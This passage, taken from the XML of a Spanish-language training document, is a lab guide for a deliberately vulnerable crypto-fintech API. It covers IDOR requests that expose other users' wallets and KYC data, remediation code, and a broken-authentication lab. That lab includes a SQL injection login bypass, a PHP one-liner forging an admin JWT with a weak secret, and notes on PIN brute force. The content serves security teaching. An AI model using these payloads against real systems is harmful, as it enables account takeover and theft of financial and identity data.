          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "wallet_id": 1,</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "transactions": [</w:t>
        <w:br/>
        <w:t xml:space="preserve">    {</w:t>
        <w:br/>
        <w:t xml:space="preserve">      "id": 1,</w:t>
        <w:br/>
        <w:t xml:space="preserve">      "type": "deposit",</w:t>
        <w:br/>
        <w:t xml:space="preserve">      "amount": "200.00000000",</w:t>
        <w:br/>
        <w:t xml:space="preserve">      "date": "2024-01-15T10:30:00Z"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    },</w:t>
        <w:br/>
        <w:t xml:space="preserve">    {</w:t>
        <w:br/>
        <w:t xml:space="preserve">      "id": 2,</w:t>
        <w:br/>
        <w:t xml:space="preserve">      "type": "withdrawal",</w:t>
        <w:br/>
        <w:t xml:space="preserve">      "amount": "49.25000000",</w:t>
        <w:br/>
        <w:t xml:space="preserve">      "destination": "3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy",</w:t>
        <w:br/>
        <w:t xml:space="preserve">      "date": "2024-02-20T14:22:00Z"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ]</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 5 - Acceder al estado KYC de otro usuario</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X GET "http://localhost/appsec/api/v1/kyc/status.php?user_id=1" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer &lt;TOKEN_OBTENIDO&gt;"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "user_id": 1,</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "kyc_status": "verified",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "full_name": "Admin CryptoVulnX",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "document_type": "passport",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "document_number": "AB1234567"</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Remediacion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Codigo Vulnerable</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// balance.php - VULNERABLE</w:t>
        <w:br/>
        <w:t>$wallet_id = $_GET['wallet_id'];</w:t>
        <w:br/>
        <w:t>$query = "SELECT * FROM wallets WHERE id = $wallet_id";</w:t>
        <w:br/>
        <w:t>$result = $conn-&gt;query($query);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Codigo Corregido</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// balance.php - SEGURO</w:t>
        <w:br/>
        <w:t>$wallet_id = $_GET['wallet_id'];</w:t>
        <w:br/>
        <w:t>$authenticated_user_id = getAuthenticatedUserId($token);</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Agregar WHERE user_id para verificar propiedad del objeto</w:t>
        <w:br/>
        <w:t>$stmt = $conn-&gt;prepare("SELECT id, balance, currency, address FROM wallets WHERE id = ? AND user_id = ?");</w:t>
        <w:br/>
        <w:t>$stmt-&gt;bind_param("ii", $wallet_id, $authenticated_user_id);</w:t>
        <w:br/>
        <w:t>$stmt-&gt;execute();</w:t>
        <w:br/>
        <w:t>$result = $stmt-&gt;get_result();</w:t>
        <w:br/>
        <w:br/>
        <w:t>if ($result-&gt;num_rows === 0) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    http_response_code(403);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    echo json_encode(["error" =&gt; "No tienes permiso para acceder a esta wallet"]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    exit;</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t>// IMPORTANTE: No exponer private_key en la respuesta</w:t>
        <w:br/>
        <w:t>$row = $result-&gt;fetch_assoc();</w:t>
        <w:br/>
        <w:t>unset($row['private_key']);</w:t>
        <w:br/>
        <w:t>echo json_encode($row);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Principios de Remediacion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Verificar propiedad del objeto</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Siempre agregar </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>WHERE user_id = $authenticated_user_id</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> en las consultas que acceden a recursos por ID.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Obtener el user_id del token del servidor</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Nunca confiar en un </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>user_id</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> enviado por el cliente.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Filtrar campos sensibles</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Nunca exponer </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>private_key</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> u otros datos criticos en las respuestas de la API.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Usar UUIDs</w:t>
      </w:r>
      <w:r>
        <w:t>: Reemplazar IDs secuenciales por UUIDs para dificultar la enumeracion de objetos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Implementar middleware de autorizacion</w:t>
      </w:r>
      <w:r>
        <w:t>: Centralizar la logica de verificacion de propiedad en un middleware reutilizable.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>LAB 02 - Broken Authentication</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Referencia OWASP: API2:2023 - Broken Authentication</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Objetivo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Explotar multiples fallas de autenticacion en la API de CryptoVulnX: inyeccion SQL en el login, manipulacion de tokens JWT con secreto debil, algoritmo none en JWT y fuerza bruta de PIN de restablecimiento de contrasena.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Contexto</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>La vulnerabilidad de Broken Authentication agrupa multiples fallas en los mecanismos de autenticacion de una API. En CryptoVulnX, el sistema de autenticacion presenta las siguientes debilidades:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Inyeccion SQL en login</w:t>
      </w:r>
      <w:r>
        <w:t>: El endpoint de autenticacion concatena directamente los parametros del usuario en la consulta SQL sin sanitizacion ni sentencias preparadas.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>JWT con secreto debil</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Los tokens JWT se firman con el secreto </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>crypto123</w:t>
      </w:r>
      <w:r>
        <w:t>, un valor facilmente adivinable o crackeable por diccionario.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>JWT acepta algoritmo none</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: La implementacion acepta tokens con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>alg:none</w:t>
      </w:r>
      <w:r>
        <w:t>, lo que permite generar tokens sin firma valida.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>PIN de 4 digitos sin rate limiting</w:t>
      </w:r>
      <w:r>
        <w:t>: El sistema de restablecimiento de contrasena utiliza un PIN de solo 4 digitos (0000-9999) y no implementa ninguna limitacion de intentos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>En una plataforma fintech, estas vulnerabilidades permiten el acceso completo a cuentas de usuario, incluyendo fondos y operaciones financieras.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Endpoints Involucrados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C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Metodo</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Endpoint</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Descripcion</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>POST</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/v1/auth/login.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Autenticacion de usuarios (vulnerable a SQLi)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>POST</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/v1/auth/reset.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Restablecimiento de contrasena con PIN de 4 digitos</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Dificultad</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Media</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - Requiere conocimiento de inyeccion SQL, estructura JWT y scripting para fuerza bruta.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pistas</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Pista 1 - Inyeccion SQL</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">El campo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>username</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> en el login se concatena directamente en la consulta SQL. ¿Que pasaria si envias un valor que modifique la logica de la consulta? Piensa en como terminar la condicion del usuario y comentar el resto de la consulta.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Pista 2 - Manipulacion JWT</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Decodifica el token JWT recibido al hacer login (usa base64 en la parte del payload). Observa los campos </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>role</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>sub</w:t>
      </w:r>
      <w:r>
        <w:t>. El secreto de firma es una palabra comun seguida de numeros. Herramientas como jwt.io o hashcat con diccionario pueden revelarlo rapidamente.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Pista 3 - Fuerza bruta del PIN</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>El endpoint de reset acepta un PIN de 4 digitos y no tiene ningun mecanismo de rate limiting. Con solo 10,000 combinaciones posibles (0000-9999), un script simple puede probar todas en cuestion de segundos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Solucion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Ataque 1 - Inyeccion SQL en Login</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>La consulta vulnerable en el servidor es similar a:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[sql]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>SELECT * FROM users WHERE username = '$username' AND password = '$password'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 1 - Bypass de autenticacion con SQLi</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost/appsec/api/v1/auth/login.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"username":"admin'\'' -- ","password":"cualquiercosa"}'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>La consulta resultante sera:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[sql]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'cualquiercosa'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Todo despues de </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>--</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> es un comentario SQL, por lo que la verificacion de password se ignora.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "success",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEsInVzZXJuYW1lIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MTE2MDAwMDB9...",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "user_id": 1,</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "role": "admin"</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Ataque 2 - Manipulacion de JWT con Secreto Debil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 1 - Autenticarse como usuario normal</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost/appsec/api/v1/auth/login.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"username":"carlos","password":"carlos2024"}'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 2 - Decodificar el token JWT</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Extraer y decodificar el payload del JWT</w:t>
        <w:br/>
        <w:t>echo "eyJzdWIiOjMsInVzZXJuYW1lIjoiY2FybG9zIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MTE2MDAwMDB9" | base64 -d</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Resultado:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{"sub":3,"username":"carlos","role":"user","iat":1711600000}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 3 - Generar un nuevo JWT con rol admin usando el secreto "crypto123"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Generar JWT manipulado con PHP</w:t>
        <w:br/>
        <w:t>php -r '</w:t>
        <w:br/>
        <w:t>$header = base64_encode(json_encode(["alg"=&gt;"HS256","typ"=&gt;"JWT"]));</w:t>
        <w:br/>
        <w:t>$payload = base64_encode(json_encode(["sub"=&gt;3,"username"=&gt;"carlos","role"=&gt;"admin","iat"=&gt;time()]));</w:t>
        <w:br/>
        <w:t>$header = rtrim(strtr($header, "+/", "-_"), "=");</w:t>
        <w:br/>
        <w:t>$payload = rtrim(strtr($payload, "+/", "-_"), "=");</w:t>
        <w:br/>
        <w:t>$signature = rtrim(strtr(base64_encode(hash_hmac("sha256", "$header.$payload", "crypto123", true)), "+/", "-_"), "=");</w:t>
        <w:br/>
        <w:t>echo "$header.$payload.$signature\n";</w:t>
        <w:br/>
        <w:t>'</w:t>
      </w:r>
    </w:p>
    <w:p>
